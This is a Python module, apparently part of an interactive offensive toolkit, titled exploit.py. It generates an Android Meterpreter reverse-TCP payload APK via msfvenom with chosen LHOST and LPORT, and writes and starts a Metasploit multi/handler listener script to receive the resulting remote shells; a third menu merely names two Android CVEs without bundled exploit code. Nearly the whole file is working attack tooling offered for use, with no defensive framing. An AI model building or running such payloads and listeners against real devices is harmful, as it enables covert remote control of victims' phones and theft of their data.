# exploit.py
import os
from utils import get_local_ip, run_cmd, log_event

def generate_payload():
    lhost = input(f"LHOST [{get_local_ip()}]: ") or get_local_ip()
    lport = input("LPORT [4444]: ") or "4444"
    output = input("Payload output file [payload.apk]: ") or "payload.apk"

    payload_cmd = [
        "msfvenom", "-p", "android/meterpreter/reverse_tcp",
        f"LHOST={lhost}", f"LPORT={lport}",
        "-o", output
    ]
    print(f"\033[1;32m[+] Generating payload {output}\033[0m")
    run_cmd(payload_cmd)
    log_event(f"Payload generated: {output}")
    print(f"\033[1;32m[+] Payload saved as {output}\033[0m")

def start_listener():
    lport = input("LPORT [4444]: ") or "4444"
    print("\033[1;32m[+] Starting Metasploit Listener...\033[0m")
    resource_script = f"""
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT {lport}
set ExitOnSession false
exploit -j
"""
    with open("listener.rc", "w") as f:
        f.write(resource_script)

    run_cmd(["msfconsole", "-q", "-r", "listener.rc"])
    log_event(f"Started Listener on port {lport}")

def android_exploits():
    print("\033[1;33m[*] Example Android Exploits (expandable)\033[0m")
    print("""
[1] CVE-2019-2215 (Binder)
[2] CVE-2020-0022 (BlueFrag)
[0] Back
    """)
    choice = input("Exploit> ")
    if choice == "1":
        print("[!] CVE-2019-2215 requires a kernel exploit. External tools recommended.")
        log_event("Viewed CVE-2019-2215 option")
    elif choice == "2":
        print("[!] CVE-2020-0022 is Bluetooth-specific. PoC not bundled.")
        log_event("Viewed CVE-2020-0022 option")
    elif choice == "0":
        return
    else:
        print("[!] Invalid choice")

def exploit_menu():
    print("""
\033[1;36m[1] Generate Android Payload
[2] Start Listener
[3] Android Exploits Info
[0] Back\033[0m
""")
    return input("exploit> ")

def run_exploits():
    while True:
        choice = exploit_menu()
        if choice == "1":
            generate_payload()
        elif choice == "2":
            start_listener()
        elif choice == "3":
            android_exploits()
        elif choice == "0":
            break
        else:
            print("[!] Invalid option.")
